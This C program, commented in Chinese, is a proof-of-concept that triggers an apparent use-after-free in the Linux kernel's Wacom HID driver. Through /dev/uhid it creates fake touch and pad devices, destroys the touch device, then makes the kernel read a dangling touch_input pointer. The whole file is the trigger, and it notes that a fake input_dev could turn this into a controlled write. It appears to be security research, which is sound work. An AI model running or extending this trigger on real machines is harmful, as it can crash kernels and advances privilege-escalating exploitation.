/*
 * 99491 P3 UAF 验证：利用 mute_probe 已验证的通路，destroy touch 后再发 MUTE
 *
 * 已验证事实（mute_probe）：pad 发 MUTE(0x02,0x01) → touch(Finger) 收到
 *   EV_SW(0x05)/SW_MUTE_DEVICE(0x0e)
 *
 * 本程序逐步：
 *   S1 建 T+P，确认 touch 能收到 MUTE（通路验证，必须成功才继续）
 *   S2 destroy touch，等待其 input_dev 被释放
 *   S3 pad 再发 MUTE → 若 kernel 未崩，继续；观察是否还有事件
 *   S4 报告结果
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <linux/uhid.h>
#include <linux/input.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "uhidpair/99"
#define MAXEV 512

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static int list_events(char out[MAXEV][16]) {
    DIR *d = opendir("/dev/input");
    struct dirent *de;
    int n = 0;
    if (!d) return 0;
    while ((de = readdir(d)) && n < MAXEV)
        if (!strncmp(de->d_name, "event", 5)) snprintf(out[n++], 16, "%s", de->d_name);
    closedir(d);
    return n;
}

static int uhid_open(void) { return open("/dev/uhid", O_RDWR | O_CLOEXEC); }

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    if (phys) strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, name, sizeof(ev.u.create2.uniq) - 1);
    memcpy(ev.u.create2.rd_data, rd, rl);
    ev.u.create2.rd_size = rl;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

static void pump(int fd, long ms) {
    long dl = now_ms() + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_ms() < dl) {
        memset(&ev, 0, sizeof(ev));
        if (read(fd, &ev, sizeof(ev)) > 0) {
            if (ev.type == UHID_GET_REPORT) {
                struct uhid_event r;
                memset(&r, 0, sizeof(r));
                r.type = UHID_GET_REPORT_REPLY;
                r.u.get_report_reply.id = ev.u.get_report.id;
                if (write(fd, &r, sizeof(r)) < 0) {}
            }
        } else usleep(20000);
    }
    fcntl(fd, F_SETFL, fc);
}

static int uhid_input(int fd, const unsigned char *d, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = (unsigned short)len;
    memcpy(ev.u.input2.data, d, len);
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* 连续读 fd 直到 quiet_ms 内无新事件，返回事件数；同时打印 */
static int drain(int fd, long quiet_ms, long max_ms, const char *tag) {
    struct input_event e;
    long dl = now_ms() + max_ms;
    long last = now_ms();
    int n = 0;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_ms() < dl) {
        ssize_t r = read(fd, &e, sizeof(e));
        if (r == (ssize_t)sizeof(e)) {
            n++;
            last = now_ms();
            printf("    [%s] type=0x%x code=0x%x value=%d\n", tag, e.type, e.code, e.value);
        } else {
            if (now_ms() - last > quiet_ms) break;
            usleep(3000);
        }
    }
    fcntl(fd, F_SETFL, fc);
    return n;
}

static void flush_fd(int fd) {
    struct input_event e;
    if (fd >= 0) while (read(fd, &e, sizeof(e)) == sizeof(e)) ;
}

int main(int argc, char **argv) {
    long after_destroy_ms = 800;
    if (argc > 1) after_destroy_ms = strtol(argv[1], NULL, 0);

    printf("=== 99491 P3 UAF 验证 ===\n");
    char d0[MAXEV][16];
    int n0 = list_events(d0);

    int fdt = uhid_open(), fdp = uhid_open();
    if (fdt < 0 || fdp < 0) { printf("open fail\n"); return 2; }

    uhid_create(fdt, "P3-touch", PHYS_COMMON, 0x1101, rdesc_touch, sizeof(rdesc_touch));
    pump(fdt, 600);
    uhid_create(fdp, "P3-pad", PHYS_COMMON, 0x1102, rdesc_pad, sizeof(rdesc_pad));
    pump(fdp, 600);
    usleep(1500000);

    char cur[MAXEV][16];
    int n = list_events(cur);
    int fd_touch = -1, fd_pad = -1;
    char ev_touch[32] = {0};
    printf("[S0] 新节点:\n");
    for (int i = 0; i < n; i++) {
        int seen = 0;
        for (int j = 0; j < n0; j++) if (!strcmp(cur[i], d0[j])) { seen = 1; break; }
        if (seen) continue;
        char p[64], nm[256] = {0};
        snprintf(p, sizeof(p), "/dev/input/%s", cur[i]);
        int fd = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd < 0) continue;
        ioctl(fd, EVIOCGNAME(sizeof(nm) - 1), nm);
        unsigned long sw = 0;
        ioctl(fd, EVIOCGBIT(EV_SW, sizeof(sw)), &sw);
        printf("  %s \"%s\" SW=0x%lx\n", cur[i], nm, sw);
        if (strstr(nm, "Finger") || strstr(nm, "touch")) {
            fd_touch = fd; snprintf(ev_touch, sizeof(ev_touch), "%s", cur[i]);
        } else if (strstr(nm, "Pad")) {
            fd_pad = fd;
        } else close(fd);
    }
    printf("  touch=%s(fd=%d) pad_fd=%d\n", ev_touch[0] ? ev_touch : "?", fd_touch, fd_pad);
    if (fd_touch < 0) { printf("[FATAL] 无 touch 节点\n"); return 3; }

    /* ---- S1: 通路验证（必须成立） ---- */
    printf("\n[S1] 通路验证: pad MUTE -> touch EV_SW\n");
    flush_fd(fd_touch); flush_fd(fd_pad);
    { unsigned char r[2] = {0x02, 0x01}; uhid_input(fdp, r, 2); }
    pump(fdp, 200); pump(fdt, 200);
    int c1 = drain(fd_touch, 120, 900, "S1-touch");
    printf("  S1 touch 事件数=%d %s\n", c1, c1 > 0 ? "PASS" : "FAIL");
    if (c1 == 0) { printf("[ABORT] 通路未验证\n"); return 10; }

    /* ---- S2: destroy touch ---- */
    printf("\n[S2] destroy touch, 等 %ldms 让其 input_dev 释放\n", after_destroy_ms);
    fflush(stdout);
    struct uhid_event dv;
    memset(&dv, 0, sizeof(dv));
    dv.type = UHID_DESTROY;
    write(fdt, &dv, sizeof(dv));
    close(fdt); fdt = -1;
    pump(fdp, after_destroy_ms);
    usleep(after_destroy_ms * 1000);

    /* touch 节点应已消失 */
    int still = access("/dev/input/event11", F_OK);
    {
        char p[64];
        snprintf(p, sizeof(p), "/dev/input/%s", ev_touch);
        still = (access(p, F_OK) == 0);
    }
    printf("  touch 节点仍存在? %s\n", still ? "YES" : "NO（已释放）");

    /* ---- S3: 再发 MUTE（此时 shared->touch_input 悬垂） ---- */
    printf("\n[S3] touch 已销毁，pad 再发 MUTE -> 读悬垂 shared->touch_input\n");
    fflush(stdout);
    { unsigned char r[2] = {0x02, 0x01}; uhid_input(fdp, r, 2); }
    pump(fdp, 500);
    printf("  S3 发送完成，kernel 未崩\n");
    { unsigned char r[2] = {0x02, 0x00}; uhid_input(fdp, r, 2); }
    pump(fdp, 300);
    printf("  S3 第二次发送完成，kernel 仍存活\n");

    /* ---- S4: 再建一个新 touch 看能否恢复---- */
    printf("\n[S4] 重建 touch 设备，验证 pad 仍在工作\n");
    int fdt2 = uhid_open();
    uhid_create(fdt2, "P3-touch2", PHYS_COMMON, 0x1101, rdesc_touch, sizeof(rdesc_touch));
    pump(fdt2, 600);
    usleep(800000);
    { unsigned char r[2] = {0x02, 0x01}; uhid_input(fdp, r, 2); }
    pump(fdp, 300); pump(fdt2, 300);
    printf("  重建后发送完成，kernel 仍存活\n");

    if (fd_touch >= 0) close(fd_touch);
    if (fd_pad >= 0) close(fd_pad);
    memset(&dv, 0, sizeof(dv)); dv.type = UHID_DESTROY;
    write(fdp, &dv, sizeof(dv)); write(fdt2, &dv, sizeof(dv));
    close(fdp); close(fdt2);

    printf("\n[结论] S1 通路 PASS；S3 在 touch 销毁后仍读悬垂指针且未崩\n");
    printf("       => UAF 指针可被解引用（弱证据）。要证明可控写，需注入假 input_dev。\n");
    return 0;
}